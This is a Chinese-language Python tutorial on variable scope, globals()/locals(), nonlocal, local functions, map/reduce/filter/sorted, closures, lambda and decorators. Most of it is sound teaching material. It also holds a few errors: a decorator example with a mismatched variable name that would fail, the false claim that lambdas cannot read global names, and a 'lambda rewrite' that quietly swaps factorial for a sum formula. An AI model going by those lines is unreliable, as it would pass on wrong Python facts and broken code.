total = 0;                # 这是一个全局变量
def sum( arg1, arg2 ):
   #返回2个参数的和"
   total = arg1 + arg2;   # total在这里是局部变量
   print("函数内是局部变量 : ", total)
   return total;

sum( 10, 20 );
print("函数外是全局变量 : ", total)

# 输出
函数内是局部变量 :  30
函数外是全局变量 :  0

</textarea><textarea>
def text():
    global demo
    demo = "C语言中文网"
    print("函数体内访问:",demo)
text()
print('函数体外访问:',demo)

# 输出:
函数体内访问: C语言中文网
函数体外访问: C语言中文网

</textarea><pre>
【 获取指定作用域范围中的变量 】
不管是在函数的局部范围内还是在全局范围内都可能存在多个变量,每个变量持有该变量的值。从这个角度来看,不管是局部范围还是全局范围,这些变量和它们的值就像一个"看不见"的字典,其中变量名就是字典的key,变量值就是字典的value。实际上Python提供了如下三个工具函数来获取指定范围内的"变量字典":
globals():该函数返回全局范围内所有变量组成的"变量字典"。
locals():该函数返回当前局部范围内所有变量组成的"变量字典"。
vars(object):获取在指定对象范围内所有变量组成的"变量字典"。如果不传入object参数,vars()和locals()的作用完全相同。

globals()和locals()看似完全不同,但它们实际上也是有联系的,关于这两个函数的区别和联系大致有以下两点:
1、locals()总是获取当前局部范围内所有变量组成的"变量字典",因此如果在全局范围内即在函数之外调用locals()函数,同样会获取全局范围内所有变量组成的"变量字典";而 globals()无论在哪里执行,总是获取全局范围内所有变量组成的"变量字典"。
2、一般来说使用locals()和globals()获取的"变量字典"只应该被访问,不应该被修改。但实际上不管是使用globals()还是使用locals()获取的全局范围内的"变量字典"都可以被修改,而这种修改会真正改变全局变量本身:但通过locals()获取的局部范围内的"变量字典",即使对它修改也不会影响局部变量。

</pre>在使用globals()或locals()访问全局变量的"变量字典"时,将会看到程序输出的"变量字典"默认包含了很多变量,这些都是Python主程序内置的<textarea>
def test ():
    age = 20
    # 直接访问age局部变量
    print(age) # 输出20
    # 访问函数局部范围的"变量数组"
    print(locals()) # {'age': 20}
    # 通过函数局部范围的"变量数组"访问age变量
    print(locals()['age']) # 20
    # 通过locals函数局部范围的"变量数组"改变age变量的值
    locals()['age'] = 12
    # 再次访问age变量的值
    print('xxx', age) # 依然输出20
    # 通过globals函数修改x全局变量
    globals()['x'] = 19
x = 5
y = 20
print(globals()) # {..., 'x': 5, 'y': 20}
# 在全局访问内使用locals函数,访问的是全局变量的"变量数组"
print(locals()) # {..., 'x': 5, 'y': 20}
# 直接访问x全局变量
print(x) # 5
# 通过全局变量的"变量数组"访问x全局变量
print(globals()['x']) # 5
# 通过全局变量的"变量数组"对x全局变量赋值
globals()['x'] = 39
print(x) # 输出39
# 在全局范围内使用locals函数对x全局变量赋值
locals()['x'] = 99
print(x) # 输出99

</textarea><pre>
【 全局变量和局部变量的遮蔽现象 】
全局变量默认可以在所有函数内被访问,但如果在函数中定义了与全局变量同名的变量,此时就会发生局部变量遮蔽(hide)全局变量的情形

</pre><textarea>
name = 'Charlie'
def test ():
    # 直接访问name全局变量
    print(name)       # Charlie,取消下行注释之后UnboundLocalError : local variable 'name' referenced before assignment,提示所访问的name变量还未定义
    # name = '孙悟空'
test()
print(name)

</textarea><pre>
Python语法规定,在函数内部对不存在的变量赋值时,默认就是重新定义新的局部变量,这会使得函数内部遮蔽重名的name全局变量。由于局部变量name在print(name)后才初始化,所以程序会报错。

为了避免这个问题,可以通过以下两种方式来修改上面程序:
1、访问被遮蔽的全局变量。如果希望程序依然能访问name全局变量,且在函数中可重新定义name局部变量,也就是在函数中可以访问被遮蔽的全局变量,此时可通过globals()函数来实现

</pre><pre class="pu">
name = 'Charlie'
def test ():
    # 直接访问name全局变量
    print(globals()['name'])  # Charlie
    name = '孙悟空'
test()
print(name)  # Charlie

</pre><pre>
2、在函数中声明全局变量。为了避免在函数中对全局变量赋值(不是重新定义局部变量),可使用global语句来声明全局变量,test() 函数后面对 name 赋值的语句只是对全局变量赋值,而不是重新定义局部变量

</pre><pre class="pu">
name = 'Charlie'
def test ():
    # 声明name是全局变量,后面的赋值语句不会重新定义局部变量
    global name
    # 直接访问name全局变量
    print(name)  # Charlie
    name = '孙悟空'
test()
print(name)  # 孙悟空

</pre>

<h4>局部函数</h4><pre>
Python支持在函数体内定义函数,这种被放在函数体内定义的函数称为局部函数。
在默认情况下,局部函数对外部是隐藏的,局部函数只能在其封闭(enclosing)函数内有效,其封闭函数也可以返回局部函数,以便程序在其他作用域中使用局部函数。

</pre><textarea>
def get_math_func(type, nn) :
    # 定义一个计算平方的局部函数
    def square(n) :  # ①
        return n * n

    # 定义一个计算立方的局部函数
    def cube(n) :  # ②
        return n * n * n

    # 定义一个计算阶乘的局部函数
    def factorial(n) :   # ③
        result = 1
        for index in range(2, n + 1) :
            result *= index
        return result

    # 调用局部函数
    if type == "square" :
        return square(nn)
    elif type == "cube":
        return cube(nn)
    else:
        return factorial(nn)

print(get_math_func("square", 3)) # 输出9
print(get_math_func("cube", 3))   # 输出27
print(get_math_func("", 3))       # 输出6

</textarea><pre>
如果封闭函数没有返回局部函数,那么局部函数只能在封闭函数内部调用。如果封闭函数将局部函数返回,且程序使用变量保存了封闭函数的返回值,那么这些局部函数的作用域就会被扩大。因此程序完全可以自由地调用它们,就像它们都是全局函数一样

</pre>局部函数内的变量也会遮蔽它所在函数内的局部变量<textarea>
def foo ():
    # 局部变量name
    name = 'Charlie'
    def bar ():
        # 访问bar函数所在的foo函数的name局部变量
        print(name) # Charlie
        name = '孙悟空'
    bar()
foo()

# 报错:UnboundLocalError: local variable 'name' referenced before assignment

# 该错误是由局部变量遮蔽局部变量导致的,在bar()函数中定义的name局部变量遮蔽了它所在foo()函数内的name局部变量,又因为bar()函数中的name局部变量定义在print()输出函数之后,使的print(name)执行时找不到合适的name,因此导致程序报错。

# 为了声明bar()函数中的"name='孙悟空'"赋值语句不是定义新的局部变量,只是访问它所在foo()函数内的name局部变量,Python提供了nonlocal关键字,通过nonlocal语句即可声明访问赋值语句只是访问该函数所在函数内的局部变量

def foo ():
    # 局部变量name
    name = 'Charlie'
    def bar ():
        nonlocal name
        # 访问bar函数所在的foo函数的name局部变量
        print(name) # Charlie
        name = '孙悟空'
    bar()
foo()

</textarea><pre>
nonlocal和global功能大致相似,区别只是global用于声明访问全局变量,而nonlocal用于声明访问当前函数所在函数内的局部变量

</pre>
</div>

<div id="hanshushi">
<h3>函数式编程</h3><pre>
函数是Python内建支持的一种封装,通过把大段代码拆成函数,通过一层一层的函数调用就可以把复杂任务分解成简单的任务,这种分解可以称之为面向过程的程序设计。函数就是面向过程的程序设计的基本单元。
而函数式编程Functional Programming,虽然也可以归结到面向过程的程序设计,但其思想更接近数学计算。

首先要搞明白计算机(Computer)和计算(Compute)的概念。
在计算机的层次上,CPU执行的是加减乘除的指令代码以及各种条件判断和跳转指令,所以汇编语言是最贴近计算机的语言。
而计算则指数学意义上的计算,越是抽象的计算,离计算机硬件越远。
对应到编程语言就是越低级的语言越贴近计算机抽象程度低执行效率高,比如C语言;越高级的语言越贴近计算抽象程度高执行效率低,比如Lisp语言。

函数式编程就是一种抽象程度很高的编程范式,纯粹的函数式编程语言编写的函数没有变量,因此任意一个函数,只要输入是确定的,输出就是确定的,这种纯函数称之为没有副作用。而允许使用变量的程序设计语言,由于函数内部的变量状态不确定,同样的输入可能得到不同的输出,因此这种函数是有副作用的。

函数式编程的一个特点就是,允许把函数本身作为参数传入另一个函数,还允许返回一个函数

Python对函数式编程提供部分支持。由于Python允许使用变量,因此Python不是纯函数式编程语言

</pre>
</div>

<div id="Higher-order">
<h4>高阶函数 Higher-order function</h4><pre>
变量可以指向函数
函数本身可以赋值给变量,如果一个变量指向了一个函数,那么可通过该变量来调用这个函数
x = abs(-10)
print(x)       # 10
f = abs
print(f(-10))  # 10

函数名也是变量
函数名其实就是指向函数的变量,对于abs()这个函数,完全可以把函数名abs看成变量,它指向一个可以计算绝对值的函数
abs = 10
abs(-10)  # TypeError: 'int' object is not callable
把abs指向10后就无法通过abs(-10)调用该函数了,因为abs这个变量已经不指向求绝对值函数而是指向一个整数10
要恢复abs函数,请重启Python交互环境。
由于abs函数实际上是定义在import builtins模块中的,所以要让修改abs变量的指向在其它模块也生效,要用import builtins; builtins.abs = 10

传入函数
既然变量可以指向函数,函数的参数能接收变量,那么一个函数就可以接收另一个函数作为参数,这种函数就称之为高阶函数。

</pre>一个最简单的高阶函数<textarea>
def add(x, y, f):
    return f(x) + f(y)

# 调用add(-5, 6, abs)时,参数x,y和f分别接收-5,6和abs,根据函数定义可以推导计算过程为:
x = -5
y = 6
f = abs
f(x) + f(y) ==> abs(-5) + abs(6) ==> 11
return 11

# 验证
print(add(-5, 6, abs))  # 11

</textarea><pre>
Python内建函数:map()和reduce()

map(funcname, Iterable)
map将传入的函数funcname依次作用到Iterable序列的每个元素,并把结果作为新的Iterator返回

</pre><textarea>
L = []
for n in [1, 2, 3, 4, 5]:
    L.append(f(n))
print(L)

# 循环代码不能一眼看明白把f(x)作用在list的每一个元素并把结果生成一个新的list

def f(x):
    return x * x
r = map(f, [1, 2, 3, 4, 5])   # 第一个参数是f,即函数对象本身,r是一个Iterator,Iterator是惰性序列,因此通过list()函数让它把整个序列都计算出来并返回一个list
print(list(r))                 # [1, 4, 9, 16, 25]

squares = list(map(lambda x: x**2, range(10)))

squares = [x**2 for x in range(10)]

</textarea><pre>
map()作为高阶函数,事实上它把运算规则抽象了,因此不但可以计算简单的f(x)=x2,还可以计算任意复杂的函数
list(map(str, [1, 2, 3, 4, 5, 6, 7, 8, 9]))  # 把这个list所有数字转为字符串
list(map(int, str(123456)))                  # 分离出一个整数的各个数位的数字,[1,2,3,4,5,6],也可用循环求余和整除来完成

reduce把一个函数作用在一个序列[x1, x2, x3, ...]上,这个函数必须接收两个参数,reduce把结果继续和序列的下一个元素做累积计算,其效果就是:
reduce(f, [x1, x2, x3, x4]) = f(f(f(x1, x2), x3), x4)

</pre>对一个序列求和就可以用reduce实现<textarea>
from functools import reduce
def add(x, y):
    return x + y
print(reduce(add, [1, 3, 5, 7, 9]))  # 25

# 当然求和运算可以直接用Python内建函数sum(),没必要动用reduce,但是如果要把序列[1, 3, 5, 7, 9]变换成整数13579,reduce就可以派上用场:
from functools import reduce
def fn(x, y):
    return x * 10 + y
print(reduce(fn, [1, 3, 5, 7, 9]))  # 13579

# 这个例子本身没多大用处,但是如果考虑到字符串str也是一个序列,对上面的例子稍加改动,配合map()就可以写出把str转换为int的函数:
from functools import reduce
def fn(x, y):
    return x * 10 + y
def char2num(s):
    digits = {'0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9}
    return digits[s]
print(reduce(fn, map(char2num, '13579')))  # 13579

# 整理成一个str2int的函数
from functools import reduce
DIGITS = {'0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9}
def str2int(s):
    def fn(x, y):
        return x * 10 + y
    def char2num(s):
        return DIGITS[s]
    return reduce(fn, map(char2num, s))

# 还可以用lambda函数进一步简化成,假设Python没有提供int()函数,完全可以自己写一个把字符串转化为整数的函数,而且只需要几行代码
from functools import reduce
DIGITS = {'0': 0, '1': 1, '2': 2, '3': 3, '4': 4, '5': 5, '6': 6, '7': 7, '8': 8, '9': 9}
def char2num(s):
    return DIGITS[s]
def str2int(s):
    return reduce(lambda x, y: x * 10 + y, map(char2num, s))

</textarea><pre>
Python内建的filter()函数用于过滤序列
和map()类似,filter()也接收一个函数和一个序列。和map()不同的是,filter()把传入的函数依次作用于每个元素,然后根据返回值是True还是False决定保留还是丢弃该元素
filter()这个高阶函数,关键在于正确实现一个"筛选"函数。
filter()函数返回的是一个Iterator,也就是一个惰性序列,所以要强迫filter()完成计算结果,需要用list()函数获得所有结果并返回list

</pre><textarea>
# 删掉list中偶数,只保留奇数
def is_odd(n):
    return n % 2 == 1

print(list(filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15])))

# 把一个序列中的空字符串删掉
def not_empty(s):
    return s and s.strip()

print(list(filter(not_empty, ['A', '', 'B', None, 'C', '  ']))) # ['A', 'B', 'C']
print(list(filter(bool, ['A', '', 'B', None, 'C', '  '])))      # ['A', 'B', 'C', '  ']
print(bool(' ')) # True

</textarea><pre>
sorted 排序算法
排序也是在程序中经常用到的算法,无论使用冒泡排序还是快速排序,排序的核心是比较两个元素的大小。如果是数字可以直接比较,但如果是字符串或者两个dict呢？直接比较数学上的大小是没有意义的,因此比较的过程必须通过函数抽象出来。

sorted()也是一个高阶函数,用sorted()排序的关键在于实现一个映射函数

Python内置的sorted()函数就可以对list进行排序:
>>> sorted([36, 5, -12, 9, -21])  # [-21, -12, 5, 9, 36]

sorted()函数也是一个高阶函数,它还可以接收一个key函数来实现自定义的排序,例如按绝对值大小排序:
>>> sorted([36, 5, -12, 9, -21], key=abs)  # [5, 9, -12, -21, 36]

key指定的函数将作用于list的每一个元素上,并根据key函数返回的结果进行排序。对比原始的list和经过key=abs处理过的list:
list = [36, 5, -12, 9, -21]
keys = [36, 5,  12, 9,  21]
然后sorted()函数按照keys进行排序,并按照对应关系返回list相应的元素:
keys排序结果 => [5, 9,  12,  21, 36]
                |  |    |    |   |
最终结果     => [5, 9, -12, -21, 36]

再看一个字符串排序的例子:
>>> sorted(['bob', 'about', 'Zoo', 'Credit'])  # ['Credit', 'Zoo', 'about', 'bob']

默认对字符串排序是按照ASCII的大小比较的,由于'Z' < 'a',结果大写字母Z会排在小写字母a的前面。
现在提出排序应该忽略大小写,按照字母序排序。要实现这个算法,不必对现有代码大加改动,只要能用一个key函数把字符串映射为忽略大小写排序即可。忽略大小写来比较两个字符串,实际上就是先把字符串都变成大写或都变成小写再比较,给sorted传入key函数,即可实现忽略大小写的排序:
>>> sorted(['bob', 'about', 'Zoo', 'Credit'], key=str.lower)  # ['about', 'bob', 'Credit', 'Zoo']

要进行反向排序,不必改动key函数,可以传入第三个参数reverse=True:
>>> sorted(['bob', 'about', 'Zoo', 'Credit'], key=str.lower, reverse=True) # ['Zoo', 'Credit', 'bob', 'about']

从上述例子可以看出,高阶函数的抽象能力是非常强大的,而且核心代码可以保持得非常简洁

</pre>
</div>

<div id='backfunction'>
【 返回函数 】
高阶函数除了可以接受函数作为参数外,还可以把函数作为返回值

</pre>实现一个可变参数的求和<textarea>
def calc_sum(*args):
    ax = 0
    for n in args:
        ax = ax + n
    return ax

# 如果不需要立刻求和,而是在后面的代码中,根据需要再计算怎么办？可以不返回求和的结果,而是返回求和的函数
def lazy_sum(*args):
    def sum():
        ax = 0
        for n in args:
            ax = ax + n
        return ax
    return sum

f = lazy_sum(1, 3, 5, 7, 9)  # 调用lazy_sum()时返回的并不是求和结果,而是求和函数
print(f)                     # < function lazy_sum.< locals>.sum at 0x101c6ed90>
print(f())                   # 调用函数f时才真正计算求和的结果

# 调用lazy_sum()时每次调用都会返回一个新的函数,即使传入相同的参数
f1 = lazy_sum(1, 3, 5, 7, 9)
f2 = lazy_sum(1, 3, 5, 7, 9)
print(f1==f2)                # False

</textarea><pre>
在函数lazy_sum中又定义了函数sum,并且内部函数sum可以引用外部函数lazy_sum的参数和局部变量,当lazy_sum返回函数sum时相关参数和变量都保存在返回的函数中,这种称为"闭包(Closure)"的程序结构拥有极大的威力

返回的函数在其定义内部引用了局部变量args,所以当一个函数返回了一个函数后,其内部的局部变量还被新函数引用,所以闭包用起来简单,实现起来可不容易

</pre>全部都是9,原因就在于返回的函数引用了变量i,但它并非立刻执行。等到3个函数都返回时,它们所引用的变量i已经变成了3,因此最终结果为9<textarea>
def count():
    fs = []
    for i in range(1, 4):
        def f():
             return i*i
        fs.append(f)
    return fs

f1, f2, f3 = count()
print(f1())  # 9
print(f2())  # 9
print(f3())  # 9

</textarea><pre>
返回闭包时牢记一点:返回函数不要引用任何循环变量或后续会发生变化的变量
如果一定要引用循环变量怎么办？方法是再创建一个函数,用该函数的参数绑定循环变量当前的值,无论该循环变量后续如何更改,已绑定到函数参数的值不变
缺点是代码较长,可利用lambda函数缩短代码

</pre><textarea>
def count():
    def f(j):
        def g():
            return j*j
        return g
    fs = []
    for i in range(1, 4):
        fs.append(f(i))   # f(i)立刻被执行,因此i的当前值被传入f()
    return fs

f1, f2, f3 = count()
print(f1())  # 1
print(f2())  # 4
print(f3())  # 9

</textarea>
</div>

<div id="lambda">
<h4>匿名函数 lambda表达式</h4><pre>
在传入函数时,有时不需要显式地定义函数,直接传入匿名函数更方便
lambda 表达式可作为表达式、函数参数或函数返回值,因此使用lambda表达式可以让程序更加简洁

python使用lambda来创建匿名函数
1、lambda只是一个表达式,函数体比def简单很多。
2、lambda的主体是一个表达式,而不是一个代码块,仅仅能在lambda表达式中封装有限的逻辑进去。
3、lambda函数拥有自己的命名空间,且不能访问自有参数列表之外或全局命名空间里的参数。
4、虽然lambda函数看起来只能写一行,却不等同于C或C++的内联函数,后者的目的是调用小函数时不占用栈内存从而增加运行效率。

lambda函数的语法只包含一个语句,Python要求lambda表达式只能是单行表达式
lambda [arg1 [,arg2,.....argn]]:expression
在lambda关键字之后、冒号左边的是参数列表,可以没有参数,也可以有多个参数,如果有多个参数则需要用逗号隔开,冒号右边是该lambda表达式的返回值

Python对匿名函数的支持有限,只有一些简单的情况下可以使用匿名函数
匿名函数有个限制就是只能有一个表达式,不用写return,返回值就是该表达式的结果。
lambda表达式只能创建简单的函数对象,它只适合函数体为单行的情形
用匿名函数有个好处,因为函数没有名字,不必担心函数名冲突。此外匿名函数也是一个函数对象,也可以把匿名函数赋值给一个变量,再利用变量来调用该函数

ambda表达式有如下两个用途:
对于单行函数,使用lambda表达式可以省去定义函数的过程,让代码更加简洁。
对于不需要多次复用的函数,使用lambda表达式可以在用完之后立即释放,提高了性能

</pre><textarea>
sum = lambda arg1, arg2: arg1 + arg2;

等价于
def sum(arg1, arg2):
    return arg1 + arg2

# 调用sum函数
print("相加后的值为 : ", sum( 10, 20 ))
print("相加后的值为 : ", sum( 20, 20 ))

lambda x , y: x + y
# 可改写为如下函数形式:
def add(x, y):
    return x+ y

# 因为匿名函数没有名字,使用的时候要用括号把它包起来
(lambda x,y: x+y)(3,4) # 7

# 也可以把匿名函数作为返回值返回
def build(x, y):
    return lambda: x * x + y * y

</textarea>通过lambda表达式来调用Python内置的map()函数<textarea>
print(list(map(lambda x: x * x, [1, 2, 3, 4, 5])))  # [1, 4, 9, 16, 25]

# 传入计算平方的lambda表达式作为参数
x = map(lambda x: x*x , range(8))
print([e for e in x]) # [0, 1, 4, 9, 16, 25, 36, 49]

# 传入计算平方的lambda表达式作为参数
y = map(lambda x: x*x if x % 2 == 0 else 0, range(8))
print([e for e in y]) # [0, 0, 4, 0, 16, 0, 36, 0]

</textarea><textarea>
def get_math_func(type) :
    # 定义三个局部函数
    ...
    # 返回局部函数
    if type == "square" :
        return square
    if type == "cube" :
        return cube
    else:
        return factorial

由于局部函数的作用域默认仅停留在其封闭函数之内,因此这三个局部函数的函数名的作用太有限了,即仅仅是在程序的 if 语句中作为返回值使用。一旦离开了 get_math_func() 函数体,这三个局部函数的函数名就失去了意义。

既然局部函数的函数名没有太大的意义,那么就考虑使用 lambda 表达式来简化局部函数的写法。
使用lambda表达式代替局部函数,简化get_math_func()函数

def get_math_func(type) :
    result=1
    # 该函数返回的是Lambda表达式
    if type == 'square':
        return lambda n: n * n
    elif type == 'cube':
        return lambda n: n * n * n
    else:
        return lambda n: (1 + n) * n / 2

# 调用get_math_func(),程序返回一个嵌套函数
math_func = get_math_func("cube")
print(math_func(5)) # 输出125
math_func = get_math_func("square")
print(math_func(5)) # 输出25
math_func = get_math_func("other")
print(math_func(5)) # 输出15.0

</textarea>
</div>

<div id="decorator">
<h4>装饰器Decorator @函数装饰器</h4><pre>
开放--封闭原则：
封闭：以实现的功能代码不应该被修改
开放：对现有功能的扩展开放

在python中一切皆对象,函数也是一个对象,而且函数对象可以被赋值给变量,所以通过变量也能调用该函数。

</pre><textarea>
def test():
    return 'hello world'

# 函数可以赋值给其他变量
foo = test
print(foo)             # < function test at 0x7f8a83d61e18>
print(foo())           # hello world

# 函数可以当做参数传递给别的函数,也可以当做函数的返回值
def bar(func):
    print(func)        # < function test at 0x7f8a83d61e18>
    return func

print(bar)             # < function bar at 0x7f2ccd1090d0>
test2 = bar(test)
print(test2)           # < function test at 0x7f8a83d61e18>
print(test2())         # hello world

# 函数有自己的id值,有type,有自己的值
print(id(test))        # 140119976123928
print(type(test))      # < class 'function'>
print(test)            # < function test at 0x7f673a821e18>

# 函数对象有一个__name__属性可以拿到函数的名字
print(test.__name__)   # test
print(foo.__name__)    # test
print(bar.__name__)    # bar
print(test2.__name__)  # test

# 删除掉旧的函数
del test
print(test())          # NameError: name 'test' is not defined
print(foo())           # hello world

</textarea><pre>
OOP的的设计模式装饰模式需要通过继承和组合来实现,而Python除了能支持OOP的decorator外,直接从语法层次支持decorator,Python的decorator可以用函数实现,也可以用类实现。

装饰器本质上是一个函数,可增强函数的功能,即可让其他函数在不需要做任何代码处理不改动源代码的前提下增加额外的其他新功能,装饰器的返回值也是一个函数对象
经常用于有切面需求的场景,比如：插入日志、性能测试、事务处理、缓存、权限校验等场景,装饰器是解决这类问题的绝佳设计。有了装饰器就可以抽离出大量与函数功能本身无关的雷同代码到装饰器中并继续重用。概括的讲,装饰器的作用就是为已经存在的对象添加额外的功能

</pre>现在要增强add()函数的功能,比如在函数调用前后自动打印日志,但又不希望修改now()函数的定义,这种在代码运行期间动态增加功能的方式称为装饰器,本质上decorator就是一个返回函数的高阶函数<textarea>
def add(x, y):
    print(x + y)

add(1,2)

# 新需求:计算代码执行时间
import time
def add(x, y):
    start_time = time.time()
    print(x+y)
    stop_time = time.time()
    print("{func} spend {time} ".format(func = "add", time = stop_time-start_time))

add(1,2)

# 如果是个人程序,这样的解决方案无可厚非,但如果是集体开发的大型项目,这样的改动通常是不被允许的,如果大家都为了各自的需求在原函数中添加代码,很可能会造成灾难性的后果。还有一种解决方案,就是将原函数封装到一个新的函数中,在新函数中对原函数的运行时间进行计算

import time

def add(x, y):
    print(x+y)

def getaddtime(x, y):
    start_time = time.time()
    add(x, y)
    stop_time = time.time()
    print("{func} spend {time} ".format(func = "add", time = stop_time-start_time))

getaddtime(1,2)

# 使用getaddtime()函数对add()函数进行了封装,在add()函数执行前和结束后分别计时,然后求得函数耗时。这种方案不用修改原函数中的代码,看似可行,实际上存在很多的问题。使用该方案不仅需要为每一个需要功能拓展的函数分别新建一个新函数,而且还要修改所有的调用,如果需要功能拓展的函数有成百上千个,可想而知会带来多大的工作量。如何简洁优雅地实现函数的功能拓展呢？python中最佳方案是"装饰器"

import time

def decorator(func):
    '''装饰器函数,这个函数有三个特殊之处:一是使用函数对象作为参数;二是使用了内部函数(闭包)wrapper();三是返回值是一个函数对象'''
    def wrapper(x, y):
        start_time = time.time()
        func(x, y)
        stop_time = time.time()
        print("{func} spend {time} ".format(func = "add", time = stop_time-start_time))
    return wrapper

@decorator
def add(x, y):
    print(x+y)

add(1,2)

# 用@语法对add()函数进行装饰,在调用add()时add()不会立即执行,而是被当作参数传入装饰器函数decorator()中,然后在闭包wrapper中完成对add()的调用
# 乍看之下使用装饰器与上面提到的函数封装似乎差别不大,仔细分析就会发现装饰器能显著提高开发效率。首先只需要在函数定义之前添加@语句就能对所有函数进行功能拓展,大大减少了代码测试、版本更新的工作量;其次丝毫不会影响对该函数的调用,即使该函数被调用了千万次,也不需要任何的修改;第三最大限度保持了代码的可读性和扩展性,如果需要为原函数增加新的功能,只需要在函数定义前加上一条@语句。
# 进阶知识如类装饰器和函数装饰器的区别,使用装饰器后代码的执行流程,一个装饰器适配多个函数的方法,多个装饰器的执行顺序等

</textarea><textarea>
import time

# 创建一个装饰器
def timmer(func):                       # func: 被装饰的函数,return: 一个计算函数运行时间的函数
    print('start ...')
    def wrapper(*args, **kwargs):       # args:收集被装饰函数的参数,kwargs:收集被装饰函数的关键字参数
        start_time = time.time()
        time.sleep(1)                   # 让进程睡一秒
        result = func(*args, **kwargs)  # 调用被装饰的函数
        stop_time = time.time()
        print("{func} spend {time} ".format(func = "add", time = stop_time-start_time))
        return result
    return wrapper

# 使用装饰器
def add(x, y):
    print(x + y)

# 因为timmer返回的是wrapper函数对象,所以执行add()相当于执行wrapper()
add = timmer(add)
add(1, 2)
'''
start ...
3
add spend 1.0012037754058838
'''

@timmer
def add(x, y):
    print(x + y)

add(1, 2)
'''
start ...
3
add spend 1.0008959770202637
'''

</textarea>带参数的装饰器<textarea>
import time

def timmer(flag):            # flag: 接收装饰器的参数
    def outer_wrapper(func): # func: 接收被装饰的函数
        # 接收被装饰函数的参数
        def wrapper(*args, **kwargs): # args: 收集被装饰函数的参数,kwargs: 收集被装饰函数的关键字参数
            if flag == "true":
                start_time = time.time()
                result = func(*args, **kwargs)  # 调用被装饰的函数
                time.sleep(1)                   # 让进程睡一秒
                stop_time = time.time()
                print("{func} spend {time} ".format(func="add", time=stop_time - start_time))
                return result
            else:
                print("Unexpected ending")
        return wrapper
    return outer_wrapper

# 通过一个语法糖@符号来使用装饰器,所谓的语法糖便是不使用也可以完成任务,但是使用它可以让代码更简洁
@timmer(flag="false")
def add(x, y):
    print(x, y)

add(1,2)

</textarea><textarea>
# 扩展1：带有固定参数的装饰器
import time

def deco(f):
    def wrapper(a,b):
        start_time = time.time()
        f(a,b)
        end_time = time.time()
        execution_time = (end_time - start_time)*1000
        print("time is %d ms" % execution_time)
    return wrapper

@deco
def f(a,b):
    print("be on")
    time.sleep(1)
    print("result is %d" %(a+b))

if __name__ == '__main__':
    f(3,4)

# 扩展2：无固定参数的装饰器
import time

def deco(f):
    def wrapper(*args, **kwargs):
        start_time = time.time()
        f(*args, **kwargs)
        end_time = time.time()
        execution_time_ = (end_time - start_time)*1000
        print("time is %d ms" %execution_time)
    return wrapper

@deco
def f(a,b):
    print("be on")
    time.sleep(1)
    print("result is %d" %(a+b))

@deco
def f2(a,b,c):
    print("be on")
    time.sleep(1)
    print("result is %d" %(a+b+c))

if __name__ == '__main__':
    f2(3,4,5)
    f(3,4)

# 扩展3：使用多个装饰器装饰一个函数,装饰器是可以叠加使用的,当函数被多个装饰器装饰时从里向外装饰,f(3, 4) = deco01(deco02(f(3, 4)))
import time

def deco01(f):
    print('start1...')
    def wrapper(*args, **kwargs):
        print("this is deco01")
        start_time = time.time()
        f(*args, **kwargs)
        end_time = time.time()
        execution_time = (end_time - start_time)*1000
        print("time is %d ms" % execution_time)
        print("deco01 end here")
    return wrapper

def deco02(f):
    print('start2...')
    def wrapper(*args, **kwargs):
        print("this is deco02")
        f(*args, **kwargs)
        print("deco02 end here")
    return wrapper

@deco01
@deco02
def f(a,b):
    print("be on")
    time.sleep(1)
    print("result is %d" %(a+b))

if __name__ == '__main__':
    f(3,4)

# 输出
start2...
start1...
this is deco01
this is deco02
be on
result is 7
deco02 end here
time is 1001 ms
deco01 end here

</textarea>定义一个能打印日志的decorator<textarea>
def log(func):
    def wrapper(*args, **kw):
        print('call %s():' % func.__name__)
        return func(*args, **kw)
    return wrapper

# log是一个decorator,所以接受一个函数作为参数并返回一个函数,要借助Python的@语法,把decorator置于函数的定义处,相当于执行了now = log(now)
@log
def now():
    print('2015-3-25')

# 调用now()函数,不仅会运行now()函数本身,还会在运行now()函数前打印一行日志
now()

# 输出:
call now():
2015-3-25

</textarea><pre>
由于log()是一个decorator,返回一个函数,所以原来的now()函数仍存在,只是现在同名的now变量指向了新的函数,于是调用now()将执行新函数,即在log()函数中返回的wrapper()函数。
wrapper()函数的参数定义是(*args, **kw),因此wrapper()可接受任意参数的调用。在wrapper()函数内,首先打印日志,再紧接着调用原始函数。

</pre>如果decorator本身需要传入参数,那就需要编写一个返回decorator的高阶函数,例如要自定义log的文本<textarea>
def log(text):
    def decorator(func):
        def wrapper(*args, **kw):
            print('%s %s():' % (text, func.__name__))
            return func(*args, **kw)
        return wrapper
    return decorator

# 这个3层嵌套的decorator用法如下:
@log('execute')
def now():
    print('2015-3-25')

now()

# 输出:
execute now():
2015-3-25

</textarea><pre>
装饰器允许传入参数,一个携带了参数的装饰器将有三层函数,和两层嵌套的decorator相比,3层嵌套的效果是这样的:
now = log('execute')(now)
首先执行log('execute'),返回的是decorator函数,再调用返回的函数,参数是now函数,返回值最终是wrapper函数。

以上两种decorator的定义都没问题,但还差最后一步。因为函数也是对象,它有__name__等属性,但经过decorator装饰之后的函数的__name__已经从原来的'now'变成了'wrapper':
>>> now.__name__
'wrapper'

因为返回的那个wrapper()函数名字就是'wrapper',所以需要把原始函数的__name__等属性复制到wrapper()函数中,否则有些依赖函数签名的代码执行就会出错。不需要编写wrapper.__name__ = func.__name__这样的代码,Python内置的functools.wraps就是干这个事的

</pre>完整的decorator的写法:在定义wrapper()的前面加上@functools.wraps(func)<textarea>
import functools   # 导入functools模块

def log(func):
    @functools.wraps(func)
    def wrapper(*args, **kw):
        print('call %s():' % func.__name__)
        return func(*args, **kw)
    return wrapper

# 或者针对带参数的decorator:
import functools

def log(text):
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kw):
            print('%s %s():' % (text, func.__name__))
            return func(*args, **kw)
        return wrapper
    return decorator

</textarea><textarea>
import functools

def log(func):
    '''@functools.wraps(func)是python提供的装饰器。它能把原函数的元信息拷贝到装饰器里面的func函数中。函数的元信息包括docstring、name、参数列表等。去除@functools.wraps(func)之后test.__name__的输出变成了wrapper'''
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        print('call %s():' % func.__name__)
        print('args = {}'.format(*args))
        return func(*args, **kwargs)

    return wrapper

@log
def test(p):
    print(test.__name__ + " param: " + p)

test("I'm a param")

# @语法只是将函数传入装饰器函数,并无神奇之处,等效于
def test(p):
    print(test.__name__ + " param: " + p)

wrapper = log(test)
wrapper("I'm a param")

